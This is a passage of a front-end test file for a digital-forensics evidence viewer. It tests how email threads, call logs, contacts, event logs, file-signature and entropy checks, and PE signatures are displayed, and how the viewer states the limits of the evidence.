              rec('sbig', {
                type: 'SqliteDatabaseForensics',
                database: 'big.db',
                database_artifact: 'big-artifact',
                tables: ['messages'],
                live_rows: 250,
              }),
            ],
            total: 1,
            page: 1,
            page_size: pageSize,
            type: t,
          })
        }
        if (t === 'SqliteRow') {
          sqliteRowPagesRequested.push(page)
          return HttpResponse.json({
            records: all.slice((page - 1) * pageSize, page * pageSize),
            total: all.length,
            page,
            page_size: pageSize,
            type: t,
          })
        }
        return HttpResponse.json({ records: [], total: 0, page, page_size: pageSize, type: t })
      }),
    )
    renderViewer('SqliteRow')

    // First page renders; the last row of it is present, the first of page 2 is not.
    expect(await screen.findByText('row 0')).toBeInTheDocument()
    expect(screen.getByText('row 199')).toBeInTheDocument()
    expect(screen.queryByText('row 200')).not.toBeInTheDocument()

    // Only the first page was ever fetched — page 2 is not read until scrolled.
    expect(sqliteRowPagesRequested.every((p) => p === 1)).toBe(true)

    // The rail states which slice of the table is held and the honest total, so
    // "200 rows" is never read as the size of the table. The window is stated as
    // a range rather than a count because `maxPages` slides it: after eviction
    // the held rows are no longer the FIRST 200 (B4-002/B4-003).
    expect(
      screen.getByTestId('an-db-window-note').textContent,
    ).toMatch(/Rows 1–200 of 250/)
  })
})

describe('CalendarViewer', () => {
  it('groups events by day and marks all-day events', async () => {
    mockByType({
      CalendarEvent: [
        rec('c1', {
          type: 'CalendarEvent',
          summary: 'Morning standup',
          dtstart: '2024-03-01T09:00:00Z',
          dtend: '2024-03-01T09:30:00Z',
          all_day: false,
          location: 'Room 1',
        }),
        rec('c2', {
          type: 'CalendarEvent',
          summary: 'All hands',
          dtstart: '2024-03-01T14:00:00Z',
          all_day: false,
        }),
        rec('c3', {
          type: 'CalendarEvent',
          summary: 'Holiday',
          dtstart: '2024-03-02',
          all_day: true,
        }),
      ],
    })
    renderViewer('CalendarEvent')

    await screen.findByText('Morning standup')
    const days = screen.getAllByTestId('an-agenda-day')
    expect(days).toHaveLength(2)
    // First day carries both timed events.
    expect(within(days[0]).getByText('Morning standup')).toBeInTheDocument()
    expect(within(days[0]).getByText('All hands')).toBeInTheDocument()
    expect(days[0].textContent).toContain('2024-03-01')
    // Second day is the all-day holiday.
    expect(within(days[1]).getByText('Holiday')).toBeInTheDocument()
    expect(within(days[1]).getByText('All day')).toBeInTheDocument()
  })
})

describe('EmailViewer', () => {
  it('shows the reading pane with headers and body', async () => {
    mockByType({
      EmailMessage: [
        rec('em1', {
          type: 'EmailMessage',
          from: 'alice@example.com',
          from_name: 'Alice',
          to: 'bob@example.com',
          subject: 'Hello Bob',
          date: '2024-01-02T10:00:00Z',
          body_text: 'This is the secret body.',
        }),
        rec('em2', {
          type: 'EmailMessage',
          from: 'carol@example.com',
          subject: 'Second message',
          date: '2024-01-01T10:00:00Z',
          body_text: 'another body',
        }),
      ],
    })
    renderViewer('EmailMessage')

    // Newest message opens by default; body rendered. ('Hello Bob' shows in
    // both the list and the reading-pane heading, so target the heading.)
    await screen.findByRole('heading', { name: 'Hello Bob' })
    expect(screen.getByTestId('an-mail-body').textContent).toBe('This is the secret body.')
    expect(screen.getByText('bob@example.com')).toBeInTheDocument()
    expect(screen.getAllByTestId('an-mail-item')).toHaveLength(2)

    // Opening the other message swaps the body.
    await userEvent.click(screen.getByText('Second message').closest('button')!)
    expect(screen.getByTestId('an-mail-body').textContent).toBe('another body')
  })

  it('an artifact that cannot hold a body says so in its own words, not as a capture that missed one', async () => {
    // "No body was captured" reads as an acquisition that lost it. Apple
    // Mail's Envelope Index is an INDEX and never held a body, and the
    // difference decides whether an examiner goes looking for the message
    // elsewhere.
    mockByType({
      EmailMessage: [
        rec('idx1', {
          type: 'EmailMessage',
          format: 'apple_mail_envelope_index',
          from: 'lily@example.com',
          subject: "Tuesday's lesson",
          date: '2021-02-21T12:01:00Z',
          body_text: null,
          body_absent_reason:
            'the Envelope Index holds no message bodies -- it is Mail\'s index, and the body lives in an .emlx file this record does not reach',
          snippet: 'Could we move it to Thursday?',
        }),
      ],
    })
    renderViewer('EmailMessage')

    await screen.findByRole('heading', { name: "Tuesday's lesson" })
    expect(screen.queryByTestId('an-mail-body')).toBeNull()
    expect(screen.getByText(/holds no message bodies/)).toBeInTheDocument()
    expect(screen.queryByText(/No body was captured/)).toBeNull()

    // And the index's own preview is shown -- on a server-hosted mailbox it is
    // often the only text of the message on the disk -- but labelled, because
    // a snippet shown as a body would be read as the whole message.
    const snippet = screen.getByTestId('an-mail-snippet')
    expect(snippet.textContent).toContain('Could we move it to Thursday?')
    expect(snippet.textContent).toContain('not the message body')
  })

  it('a blind copy, an unrecognised recipient type and the date basis all reach the screen', async () => {
    // Each of these was reaching the record and stopping there. A bcc is a
    // finding about who could see whom; an address whose recipient type the
    // parser refused to guess is lost unless it is shown as what it is; and a
    // date read under an epoch nothing confirmed is 31 years out from the
    // right one while looking entirely ordinary.
    mockByType({
      EmailMessage: [
        rec('idx2', {
          type: 'EmailMessage',
          format: 'apple_mail_envelope_index',
          from: 'a@example.com',
          to: ['b@example.com'],
          cc: [],
          bcc: ['hidden@example.com'],
          recipients_unrecognised_type: ['odd@example.com'],
          subject: 'Who saw this',
          date: '2021-02-21T12:01:00Z',
          date_basis: 'read as Unix epoch seconds; NOT confirmed against a populated database',
          recipient_count_is_a_floor: 'more than 64 addresses were named, so the count is at least this many',
          basis_statement: 'the schema is Apple own; no row has been read from a mailbox Apple populated',
        }),
      ],
    })
    renderViewer('EmailMessage')

    await screen.findByRole('heading', { name: 'Who saw this' })
    expect(screen.getByText('Bcc')).toBeInTheDocument()
    expect(screen.getByText('hidden@example.com')).toBeInTheDocument()
    expect(screen.getByText('Recipient type not recognised')).toBeInTheDocument()
    expect(screen.getByText('odd@example.com')).toBeInTheDocument()
    expect(screen.getByText(/NOT confirmed against a populated database/)).toBeInTheDocument()
    expect(screen.getByText(/at least this many/)).toBeInTheDocument()
    expect(screen.getByText(/no row has been read from a mailbox Apple populated/)).toBeInTheDocument()
  })

  it('a message with no body and no stated reason keeps the generic wording', async () => {
    mockByType({
      EmailMessage: [
        rec('nb1', {
          type: 'EmailMessage',
          from: 'a@example.com',
          subject: 'Headers only',
          date: '2024-01-02T10:00:00Z',
        }),
      ],
    })
    renderViewer('EmailMessage')
    await screen.findByRole('heading', { name: 'Headers only' })
    expect(screen.getByText(/No body was captured/)).toBeInTheDocument()
    expect(screen.queryByTestId('an-mail-snippet')).toBeNull()
  })

  // --- threading (ROADMAP §5.14) ---
  //
  // Email parses with headers and bodies, and this was the one channel most
  // likely to carry a long exchange and the one that could not be read as an
  // exchange. The key is derived at parse time from the RFC 5322 headers and
  // read off the record here; nothing in the viewer re-derives it.

  /** One email record, threaded as `seance_plugin_email::thread` threads one. */
  const mail = (
    id: string,
    subject: string,
    key: string | null,
    epoch: number,
    basis = 'references_root',
  ) => {
    const meta: Record<string, unknown> = {
      type: 'EmailMessage',
      from: 'alice@example.com',
      subject,
      date: new Date(epoch * 1000).toISOString(),
      date_epoch: epoch,
      body_text: `body of ${subject}`,
    }
    if (key) {
      meta.email_thread_key = key
      meta.email_thread_basis = basis
      meta.email_thread_basis_note =
        basis === 'in_reply_to'
          ? 'This message carries no References header, so it is grouped by the parent its In-Reply-To header names. A reply to a reply keys on its own parent rather than on the thread root, so a deeper exchange may appear here as more than one thread.'
          : 'This message carries its own ancestry in the References header and names its thread root.'
    } else {
      meta.email_thread_unavailable_reason =
        'This message carries no Message-ID, In-Reply-To or References header, so the exchange it belongs to cannot be addressed from the evidence.'
    }
    return rec(id, meta)
  }

  it('groups an exchange into one thread, read oldest first', async () => {
    mockByType({
      EmailMessage: [
        mail('e1', 'Invoice 4471', 'root@ex', 1_700_000_000),
        mail('e2', 'Re: Invoice 4471', 'root@ex', 1_700_000_100),
        mail('e3', 'Re: Invoice 4471 (paid)', 'root@ex', 1_700_000_200),
        mail('e4', 'Lunch', 'other@ex', 1_700_000_050),
      ],
    })
    renderViewer('EmailMessage')

    // Two exchanges, newest first, each named by its newest subject.
    const threads = await screen.findAllByTestId('an-mail-thread')
    expect(threads).toHaveLength(2)
    expect(threads[0]).toHaveTextContent('Re: Invoice 4471 (paid)')
    expect(threads[0]).toHaveTextContent('3 messages')
    expect(threads[1]).toHaveTextContent('Lunch')
    expect(threads[1]).toHaveTextContent('1 message')

    // The open exchange lists its own messages, oldest first, and opens on the
    // newest — which is where a reader picks a thread up.
    const inThread = screen.getAllByTestId('an-mail-item')
    expect(inThread).toHaveLength(3)
    expect(inThread[0]).toHaveTextContent('Invoice 4471')
    expect(inThread[2]).toHaveTextContent('Re: Invoice 4471 (paid)')
    expect(screen.getByTestId('an-mail-body').textContent).toBe(
      'body of Re: Invoice 4471 (paid)',
    )

    // Switching exchange switches the messages with it.
    await userEvent.click(threads[1])
    expect(screen.getAllByTestId('an-mail-item')).toHaveLength(1)
    expect(screen.getByTestId('an-mail-body').textContent).toBe('body of Lunch')
  })

  /**
   * A thread assembled from `In-Reply-To` alone can be a fragment of a longer
   * exchange, and a reader who takes it for the whole of one has been misled by
   * this screen rather than by the evidence.
   */
  it('says when an exchange may be a fragment of a longer one', async () => {
    mockByType({
      EmailMessage: [
        mail('e1', 'Invoice', 'root@ex', 1_700_000_000, 'references_root'),
        mail('e2', 'Re: Invoice', 'root@ex', 1_700_000_100, 'in_reply_to'),
      ],
    })
    renderViewer('EmailMessage')

    const note = await screen.findByTestId('an-mail-basis-note')
    expect(note).toHaveTextContent(/may be a fragment/)
    // And the message being read says how it was placed, in the parser's words.
    expect(
      screen.getByText(/grouped by the parent its In-Reply-To header names/),
    ).toBeInTheDocument()
  })

  /**
   * Messages with none of the three headers belong to no addressable exchange.
   * They are collected so they are reachable, and the pane says outright that
   * being collected together is not a claim that they belong together.
   */
  it('does not present unthreadable messages as an exchange', async () => {
    mockByType({
      EmailMessage: [
        mail('e1', 'Invoice', 'root@ex', 1_700_000_000),
        mail('e2', 'Orphan one', null, 1_700_000_100),
        mail('e3', 'Orphan two', null, 1_700_000_200),
      ],
    })
    renderViewer('EmailMessage')

    const threads = await screen.findAllByTestId('an-mail-thread')
    expect(threads).toHaveLength(2)
    // The residue sorts last, whatever its dates: it is not an exchange.
    expect(threads[1]).toHaveTextContent('Not in any exchange')
    expect(threads[1]).toHaveTextContent('2 messages that could not be threaded')

    await userEvent.click(threads[1])
    const note = screen.getByTestId('an-mail-no-thread-note')
    expect(note).toHaveTextContent(/not/)
    expect(note).toHaveTextContent(/because they belong together/)
    // The record's own reason reaches the reading pane as well as the pane's
    // own note above the list, so a reader of one message is told too.
    expect(screen.getByText('Not threaded')).toBeInTheDocument()
    expect(
      screen.getAllByText(/cannot be addressed from the evidence/).length,
    ).toBeGreaterThanOrEqual(2)
  })

  /** The hop the Communications table links into: the right exchange, at the
   *  right message. */
  it('opens the exchange and the message a deep link names', async () => {
    mockByType({
      EmailMessage: [
        mail('e1', 'Invoice', 'root@ex', 1_700_000_000),
        mail('e2', 'Re: Invoice', 'root@ex', 1_700_000_100),
        mail('e3', 'Lunch', 'other@ex', 1_700_000_500),
      ],
    })
    // Without the link the newest exchange (Lunch) would open.
    renderViewer('EmailMessage', '?conv=root%40ex&focus=e1')

    await screen.findByRole('heading', { name: 'Invoice' })
    expect(screen.getAllByTestId('an-mail-item')).toHaveLength(2)
    expect(screen.getByTestId('an-mail-body').textContent).toBe('body of Invoice')
  })

  it('renders HTML email in a sandboxed, CSP-locked frame', async () => {
    mockByType({
      EmailMessage: [
        rec('em1', {
          type: 'EmailMessage',
          from: 'alice@example.com',
          subject: 'HTML mail',
          date: '2024-01-02T10:00:00Z',
          body_html:
            '<p>Hello <b>Bob</b></p><img src="http://tracker.example/x.gif">',
        }),
      ],
    })
    renderViewer('EmailMessage')

    await screen.findByRole('heading', { name: 'HTML mail' })
    expect(screen.getByText(/remote content blocked/i)).toBeInTheDocument()

    const frame = document.querySelector('iframe') as HTMLIFrameElement | null
    expect(frame).not.toBeNull()
    // sandbox="" blocks scripts/navigation; the CSP blocks remote resources.
    expect(frame!.getAttribute('sandbox')).toBe('')
    const srcdoc = frame!.getAttribute('srcdoc') ?? ''
    expect(srcdoc).toContain('Content-Security-Policy')
    expect(srcdoc).toContain('img-src data:')
    expect(srcdoc).toContain('Hello')
  })

  it('says so beneath a body the parser cut at its 64 KiB cap', async () => {
    // The parser cuts the body and declares it on `body_truncated`; nothing
    // read that key, so the reading pane showed a cut message as the message.
    // A body is the field most likely to be quoted in a report, and a sentence
    // that is not there reads as one that was never written.
    mockByType({
      EmailMessage: [
        rec('em-cut', {
          type: 'EmailMessage',
          from: 'alice@example.com',
          subject: 'Long thread',
          date: '2024-01-02T10:00:00Z',
          body_text: 'the first sixty-four kilobytes',
          body_truncated: true,
        }),
      ],
    })
    renderViewer('EmailMessage')

    await screen.findByRole('heading', { name: 'Long thread' })
    // The body itself is untouched — the qualifier sits beside it, not in it.
    expect(screen.getByTestId('an-mail-body').textContent).toBe(
      'the first sixty-four kilobytes',
    )
    expect(
      screen.getByText(/This message body covers only part of the underlying data/),
    ).toBeInTheDocument()
    expect(
      screen.getByText(/not evidence it was never written/),
    ).toBeInTheDocument()
  })

  it('says nothing beneath a body the parser recorded whole', async () => {
    // A qualifier under every message is one an examiner learns to skip.
    mockByType({
      EmailMessage: [
        rec('em-whole', {
          type: 'EmailMessage',
          from: 'alice@example.com',
          subject: 'Short note',
          date: '2024-01-02T10:00:00Z',
          body_text: 'see you at six',
          body_truncated: false,
        }),
      ],
    })
    renderViewer('EmailMessage')

    await screen.findByRole('heading', { name: 'Short note' })
    expect(screen.queryByText(/covers only part of the underlying data/)).not.toBeInTheDocument()
    expect(screen.queryByText(/does not declare how much/)).not.toBeInTheDocument()
  })
})

describe('PlistViewer', () => {
  it('renders a tree whose nested nodes expand on demand', async () => {
    mockByType({
      PlistFile: [
        rec('p1', {
          type: 'PlistFile',
          filename: 'Info.plist',
          plist_type: 'Bundle Info',
          content: {
            CFBundleIdentifier: 'com.example.app',
            Nested: { Key: 'val' },
            Items: [1, 2],
          },
        }),
      ],
    })
    renderViewer('PlistFile')

    // Top-level keys visible; nested value hidden until expanded.
    await screen.findByText('CFBundleIdentifier')
    expect(screen.getByText('com.example.app')).toBeInTheDocument()
    expect(screen.queryByText('val')).not.toBeInTheDocument()

    await userEvent.click(screen.getByText('Nested').closest('button')!)
    expect(screen.getByText('Key')).toBeInTheDocument()
    expect(screen.getByText('val')).toBeInTheDocument()
  })
})

describe('BrowserHistoryViewer', () => {
  it('renders a top-domains chart above the table', async () => {
    mockByType({
      BrowserHistory: [
        rec('b1', {
          type: 'BrowserHistory',
          browser: 'Chrome',
          url: 'https://example.com/a',
          title: 'Page A',
          visit_count: 3,
          visit_time: 1704110400,
        }),
        rec('b2', {
          type: 'BrowserHistory',
          browser: 'Chrome',
          url: 'https://example.com/b',
          title: 'Page B',
          visit_count: 1,
          visit_time: 1704110400,
        }),
        rec('b3', {
          type: 'BrowserHistory',
          browser: 'Firefox',
          url: 'https://other.org/x',
          title: 'Page X',
          visit_count: 1,
          visit_time: 1704110400,
        }),
      ],
    })
    renderViewer('BrowserHistory')

    await screen.findByText('Page A')
    const chart = screen.getByTestId('an-domain-chart')
    expect(chart).toBeInTheDocument()
    // Two distinct hosts charted; example.com aggregated across two visits.
    const rows = within(chart).getAllByTestId('an-domain-row')
    expect(rows).toHaveLength(2)
    expect(within(chart).getByText('example.com')).toBeInTheDocument()
    expect(within(chart).getByText('other.org')).toBeInTheDocument()
    // The full table still renders below the chart.
    expect(screen.getByText('Page X')).toBeInTheDocument()
  })
})

describe('CallLogViewer', () => {
  it('shows the summary, direction badges, mm:ss durations, and sorts by column', async () => {
    mockByType({
      CallLog: [
        rec('sum', {
          type: 'CallLog',
          subtype: 'summary',
          platform: 'iOS',
          call_count: 3,
          incoming_count: 1,
          outgoing_count: 1,
          missed_count: 1,
        }),
        rec('call-a', {
          type: 'CallLog',
          subtype: 'call',
          platform: 'iOS',
          direction: 'incoming',
          contact: '+15551110000',
          number: '+15551110000',
          timestamp: 1000,
          duration_seconds: 75,
        }),
        rec('call-b', {
          type: 'CallLog',
          subtype: 'call',
          platform: 'iOS',
          direction: 'outgoing',
          contact: '+15552220000',
          number: '+15552220000',
          timestamp: 3000,
          duration_seconds: 5,
        }),
        rec('call-c', {
          type: 'CallLog',
          subtype: 'call',
          platform: 'iOS',
          direction: 'missed',
          contact: '+15553330000',
          number: '+15553330000',
          timestamp: 2000,
          duration_seconds: 0,
        }),
      ],
    })
    renderViewer('CallLog')

    // Summary strip carries the parser's counts (not the row count).
    const summary = await screen.findByTestId('an-call-summary')
    expect(within(summary).getByText('Calls')).toBeInTheDocument()

    // Three call rows; the summary record is not a row.
    const rows = screen.getAllByTestId('an-call-row')
    expect(rows).toHaveLength(3)

    // Direction labels and a mm:ss duration are rendered.
    expect(within(rows[0]).getByText('Outgoing')).toBeInTheDocument()
    expect(screen.getByText('1:15')).toBeInTheDocument()

    // Default sort is newest-first by time (desc): b (3000), c (2000), a (1000).
    const contactOf = (row: HTMLElement) => row.querySelectorAll('td')[1].textContent
    expect(rows.map(contactOf)).toEqual(['+15552220000', '+15553330000', '+15551110000'])

    // Sorting by duration: first click is descending (longest 75s call first).
    await userEvent.click(screen.getByRole('button', { name: /Duration/ }))
    expect(contactOf(screen.getAllByTestId('an-call-row')[0])).toBe('+15551110000')
    // Second click flips to ascending, so the 0s missed call rises to the top.
    await userEvent.click(screen.getByRole('button', { name: /Duration/ }))
    expect(contactOf(screen.getAllByTestId('an-call-row')[0])).toBe('+15553330000')
  })
})

describe('ContactViewer', () => {
  it('shows the summary, lists contacts, and filters via search', async () => {
    mockByType({
      Contact: [
        rec('c-sum', {
          type: 'Contact',
          subtype: 'summary',
          platform: 'Android',
          contact_count: 2,
          with_phone_count: 2,
          with_email_count: 1,
        }),
        rec('c-alice', {
          type: 'Contact',
          subtype: 'contact',
          platform: 'Android',
          display_name: 'Alice Example',
          phone_numbers: ['+15551110000'],
          emails: ['alice@example.com'],
          organization: 'Acme',
        }),
        rec('c-bob', {
          type: 'Contact',
          subtype: 'contact',
          platform: 'Android',
          display_name: 'Bob Sample',
          phone_numbers: ['+15552220000'],
          emails: [],
          organization: null,
        }),
      ],
    })
    renderViewer('Contact')

    const summary = await screen.findByTestId('an-contact-summary')
    expect(within(summary).getByText('With email')).toBeInTheDocument()

    // Both contacts listed (summary is not a row), sorted by name.
    let contacts = screen.getAllByTestId('an-contact-row')
    expect(contacts).toHaveLength(2)
    expect(within(contacts[0]).getByText('Alice Example')).toBeInTheDocument()
    expect(within(contacts[0]).getByText('alice@example.com')).toBeInTheDocument()

    // Searching narrows to the matching contact.
    await userEvent.type(screen.getByLabelText('Search contacts'), 'bob')
    contacts = screen.getAllByTestId('an-contact-row')
    expect(contacts).toHaveLength(1)
    expect(within(contacts[0]).getByText('Bob Sample')).toBeInTheDocument()
  })

  it('does not print zero for a count the summary never carried', async () => {
    // `metaNum` returns null when the parser reported no such count. `?? 0`
    // rendered that as "0 with email" — the UI asserting, of its own accord,
    // that not one contact in this address book has an email address.
    mockByType({
      Contact: [
        rec('c-sum', {
          type: 'Contact',
          subtype: 'summary',
          platform: 'Android',
          contact_count: 2,
          // with_phone_count / with_email_count deliberately absent.
        }),
        rec('c-alice', {
          type: 'Contact',
          subtype: 'contact',
          platform: 'Android',
          display_name: 'Alice Example',
          phone_numbers: ['+15551110000'],
        }),
      ],
    })
    renderViewer('Contact')

    const summary = await screen.findByTestId('an-contact-summary')
    expect(within(summary).getByText('2')).toBeInTheDocument()
    expect(within(summary).queryByText('0')).toBeNull()
    expect(within(summary).getAllByText('—')).toHaveLength(2)
  })
})

describe('Rich viewers (makeRichViewer)', () => {
  it('event log: shows severity tiles, flags a notable event id, and filters', async () => {
    mockByType({
      EvtxLogEntry: [
        rec('e1', {
          type: 'EvtxLogEntry',
          event_id: 1102,
          level_description: 'Information',
          provider_name: 'Eventlog',
          channel: 'Security',
          timestamp: 1_700_000_000,
          short_desc: 'audit log cleared',
        }),
        rec('e2', {
          type: 'EvtxLogEntry',
          event_id: 4625,
          level_description: 'Error',
          provider_name: 'Security-Auditing',
          channel: 'Security',
          timestamp: 1_700_000_500,
          short_desc: 'failed logon',
        }),
        rec('e3', {
          type: 'EvtxLogEntry',
          event_id: 6005,
          level_description: 'Information',
          provider_name: 'Eventlog',
          channel: 'System',
          timestamp: 1_700_001_000,
          short_desc: 'log started',
        }),
      ],
    })
    renderViewer('EvtxLogEntry')

    // Severity stat tiles render (with counts) and the volume histogram appears.
    expect(await screen.findByRole('button', { name: /Error/ })).toBeInTheDocument()
    expect(screen.getByLabelText('Events over time')).toBeInTheDocument()

    // The security-relevant event (1102 = log cleared) is flagged notable.
    const flag = screen.getByTitle(/log was cleared/i)
    expect(flag).toBeInTheDocument()

    // Clicking the Error severity tile filters the table down to that event.
    await userEvent.click(screen.getByRole('button', { name: /Error/ }))
    expect(screen.getByText('failed logon')).toBeInTheDocument()
    expect(screen.queryByText('log started')).not.toBeInTheDocument()
  })

  it('file signatures: highlights extension mismatches', async () => {
    mockByType({
      FileSignatureAnalysis: [
        rec('f1', {
          type: 'FileSignatureAnalysis',
          filename: 'invoice.pdf',
          detected_type: 'PE executable',
          actual_extension: 'pdf',
          signature_mismatch: true,
        }),
        rec('f2', {
          type: 'FileSignatureAnalysis',
          filename: 'photo.jpg',
          detected_type: 'JPEG image',
          signature_mismatch: false,
        }),
      ],
    })
    renderViewer('FileSignatureAnalysis')

    // A mismatch stat tile and a per-row notable flag both surface the spoof.
    // The specific detected-vs-claimed reason appears on both the row's notable
    // flag and the Signature cell (tooltip), and the cell shows it inline.
    expect(await screen.findByRole('button', { name: /Extension mismatch/ })).toBeInTheDocument()
    expect(
      screen.getAllByTitle(
        /Content detected as PE executable, but the file is named \.pdf/i,
      ).length,
    ).toBeGreaterThanOrEqual(2)
    // The cell surfaces the detected-vs-claimed inline: "PE executable ≠ .pdf".
    expect(screen.getByText(/PE executable ≠ \.pdf/)).toBeInTheDocument()
  })

  it('file signatures: an entropy figure measured over a prefix says so, with the byte count', async () => {
    // What an examiner learns from entropy is whether content is encrypted or
    // packed. The plugin measures at most the first 192 KiB and declares that
    // on `entropy_sampled` / `entropy_bytes` / `entropy_file_bytes` /
    // `entropy_note`; nothing read those keys, so a prefix figure reached the
    // screen as the file's entropy.
    const note =
      'entropy was measured over the first 196608 of 4000000 bytes; it describes that prefix and not the whole file'
    mockByType({
      FileSignatureAnalysis: [
        rec('e1', {
          type: 'FileSignatureAnalysis',
          filename: 'setup.exe',
          entropy: 7.99,
          entropy_classification: 'high',
          entropy_sampled: true,
          entropy_bytes: 196608,
          entropy_file_bytes: 4000000,
          entropy_note: note,
        }),
        rec('e2', {
          type: 'FileSignatureAnalysis',
          filename: 'small.bin',
          entropy: 3.1,
          entropy_classification: 'low',
          entropy_sampled: false,
          entropy_bytes: 2048,
          entropy_file_bytes: 2048,
        }),
        rec('e3', {
          type: 'FileSignatureAnalysis',
          filename: 'legacy.bin',
          entropy: 6.5,
          entropy_classification: 'medium',
        }),
      ],
    })
    renderViewer('FileSignatureAnalysis')

    // The sampled row is marked, and the plugin's own sentence travels with it.
    const sampled = await screen.findAllByTitle(note)
    // Both the figure and the class it was derived from carry the mark: the
    // class is the part an examiner quotes.
    expect(sampled.length).toBeGreaterThanOrEqual(2)
    expect(sampled[0]).toHaveTextContent('sampled')
    // The byte count is on screen, not only behind a hover: a printed page and
    // a screenshot have no hover.
    expect(screen.getByText(/first 196,608 of 4,000,000 bytes/)).toBeInTheDocument()

    // The whole-file row is NOT marked — a qualifier on every row is one an
    // examiner learns to skip.
    expect(screen.getByText('3.1')).toBeInTheDocument()
    expect(screen.queryByText(/first 2,048 of/)).not.toBeInTheDocument()

    // A record that never declared its extent is not reported as whole.
    expect(
      screen.getAllByTitle(/does not declare how much of the underlying data it covers/i)
        .length,
    ).toBeGreaterThanOrEqual(2)

    // The entropy-class bars keep a sampled class out of the whole-file bar:
    // "N files are high-entropy" is not what a prefix supports.
    expect(screen.getByText('high (sampled)')).toBeInTheDocument()
    expect(screen.getByText('medium (scope not stated)')).toBeInTheDocument()
  })

  it('file signatures: a hidden-data check that did not run is not shown as a clean file', async () => {
    // The overlay check walks a file to its format's logical end and reports
    // anything appended past it. Three of its four outcomes used to render the
    // same blank cell in a row tiled "Signature OK": walked-clean, a walk the
    // plugin could not finish, and a format this build has no walker for. Only
    // the first is evidence that nothing is concealed.
    mockByType({
      FileSignatureAnalysis: [
        rec('t1', {
          type: 'FileSignatureAnalysis',
          filename: 'clean.jpg',
          detected_type: 'JPEG',
          actual_extension: 'jpg',
          signature_mismatch: false,
          trailing_data: false,
          trailing_data_check: 'none',
        }),
        rec('t2', {
          type: 'FileSignatureAnalysis',
          filename: 'huge.png',
          detected_type: 'PNG',
          actual_extension: 'png',
          signature_mismatch: false,
          trailing_data_check: 'undetermined',
          trailing_data_undetermined: true,
          trailing_data_undetermined_reason: 'cap_reached',
        }),
        rec('t3', {
          type: 'FileSignatureAnalysis',
          filename: 'report.pdf',
          detected_type: 'PDF',
          actual_extension: 'pdf',
          signature_mismatch: false,
          trailing_data_check: 'not_applicable',
          trailing_data_not_applicable_reason: 'no_logical_end_walker_for_format',
        }),
        rec('t4', {
          type: 'FileSignatureAnalysis',
          filename: 'legacy.bin',
          detected_type: 'GIF',
          actual_extension: 'gif',
          signature_mismatch: false,
        }),
      ],
    })
    renderViewer('FileSignatureAnalysis')

    // The stopped walk is named, and what the gap costs travels with it — not
    // only the word, which on its own reads as a minor caveat.
    const stopped = await screen.findByLabelText(
      /not determined — .*could not reach a conclusion[\s\S]*never inspected[\s\S]*not a finding that the file is clean/i,
    )
    expect(stopped).toHaveTextContent('not determined')
    // The plugin's reason is phrased, not left as a raw token.
    expect(
      screen.getByText(/a parser safety cap stopped the read/i),
    ).toBeInTheDocument()

    // The format with no walker says so instead of leaving a blank that reads
    // as "checked, nothing found".
    const na = screen.getByText('not applicable')
    expect(na.getAttribute('title')).toMatch(
      /has no logical end that this build knows how to locate/i,
    )
    // and why, in words rather than the producer's token.
    expect(na.getAttribute('title')).toMatch(/this build has no walker for this file format/i)

    // A record that never declared an outcome is not promoted to clean.
    expect(screen.getByText('not stated')).toBeInTheDocument()

    // Only the file that was actually walked is cleared, and it says the word
    // rather than leaving the same blank the other three used to leave.
    const cleared = screen.getAllByTitle(
      /walked to its format's logical end and nothing follows it/i,
    )
    expect(cleared).toHaveLength(1)
    expect(cleared[0]).toHaveTextContent('none')

    // The tiles keep "could not conclude" out of "Signature OK": one file was
    // cleared and one had no applicable check; two produced no result at all.
    const inconclusive = await screen.findByRole('button', {
      name: /Hidden-data check inconclusive/,
    })
    expect(within(inconclusive).getByText('2')).toBeInTheDocument()
    const okTile = screen.getByRole('button', { name: /Signature OK/ })
    expect(within(okTile).getByText('2')).toBeInTheDocument()
  })

  it('recycle bin: a path cut short by the $I record is marked, and its extension is kept out of the type bars', async () => {
    mockByType({
      RecycleBinEntry: [
        rec('r1', {
          type: 'RecycleBinEntry',
          original_path: 'C:\\Users\\alice\\Documents\\repor',
          original_path_truncated: true,
          file_size: 1024,
        }),
        rec('r2', {
          type: 'RecycleBinEntry',
          original_path: 'C:\\Users\\alice\\Documents\\notes.txt',
          file_size: 2048,
        }),
      ],
    })
    renderViewer('RecycleBinEntry')

    // The truncated row is marked with the parser's meaning attached.
    const marks = await screen.findAllByTitle(
      /record ran out before the path ended/i,
    )
    expect(marks.length).toBeGreaterThanOrEqual(1)
    expect(marks[0]).toHaveTextContent('truncated')

    // The intact path still buckets by its real extension; the truncated one is
    // named as unknown rather than filed under the fragment's tail.
    expect(screen.getAllByText('txt').length).toBeGreaterThanOrEqual(1)
    expect(
      screen.getAllByText('(path truncated — type unknown)').length,
    ).toBeGreaterThanOrEqual(1)
  })

  it('PE / Authenticode: tiles by signature state and flags a tampered binary', async () => {
    mockByType({
      PeSignature: [
        rec('pe1', {
          type: 'PeSignature',
          name: 'strings.exe',
          signed: true,
          signature_integrity: 'valid',
          publisher: 'Microsoft Corporation',
          imphash: 'aabbccdd',
          machine: 'x86-64',
          compile_timestamp: 1_600_000_000,
          likely_packed: false,
        }),
        rec('pe2', {
          type: 'PeSignature',
          name: 'dropper.exe',
          signed: true,
          signature_integrity: 'mismatch',
          publisher: 'Microsoft Corporation',
          likely_packed: true,
        }),
        rec('pe3', {
          type: 'PeSignature',
          name: 'tool.exe',
          signed: false,
        }),
      ],
    })
    renderViewer('PeSignature')

    // A stat tile per signature state.
    expect(
      await screen.findByRole('button', { name: /Signature valid/ }),
    ).toBeInTheDocument()
    expect(screen.getByRole('button', { name: /Signature invalid/ })).toBeInTheDocument()
    expect(screen.getByRole('button', { name: /Unsigned/ })).toBeInTheDocument()

    // The tampered binary shows a MISMATCH badge and a notable reason.
    expect(screen.getByText('MISMATCH')).toBeInTheDocument()
    expect(screen.getAllByTitle(/does not match the file/i).length).toBeGreaterThanOrEqual(1)
  })

  it('Voicemail: renders callers and marks a deleted voicemail', async () => {
    mockByType({
      Voicemail: [
        rec('v1', {
          type: 'Voicemail',
          sender: '+420777050540',
          callback_number: '+420111222333',
          duration_seconds: 42,
          date: 1_673_000_000,
          deleted: false,
        }),
        rec('v2', {
          type: 'Voicemail',
          sender: '+15551234567',
          duration_seconds: 7,
          date: 1_673_100_000,
          deleted: true,
        }),
      ],
    })
    renderViewer('Voicemail')

    expect(await screen.findByText('+420777050540')).toBeInTheDocument()
    expect(screen.getByText('deleted')).toBeInTheDocument()
  })

  // HUNT-190: a NULL `trashed_date` is sent as `deleted: null` — the column
  // recorded nothing — and the screen says so rather than showing the
  // not-deleted dash.
